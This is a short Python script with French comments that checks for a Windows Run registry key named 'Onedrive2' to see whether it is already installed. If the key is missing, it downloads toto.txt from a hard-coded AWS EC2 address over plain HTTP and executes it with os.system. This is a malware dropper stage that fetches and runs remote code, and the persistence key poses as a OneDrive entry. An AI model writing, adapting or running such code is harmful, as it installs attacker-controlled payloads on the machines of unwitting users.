import winreg
import base64
import requests
import os

try :
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Onedrive2', 0, winreg.KEY_READ)
    winreg.CloseKey(registry_key)
    print('La cle existe')
except :
    print('je telecharge le script')
    Url = "http://ec2-18-188-199-240.us-east-2.compute.amazonaws.com/windows/toto.txt"
    r = requests.get(Url, allow_redirects=True)
    open('toto.txt','wb').write(r.content)
    print(os.listdir())
    os.system('toto.txt')
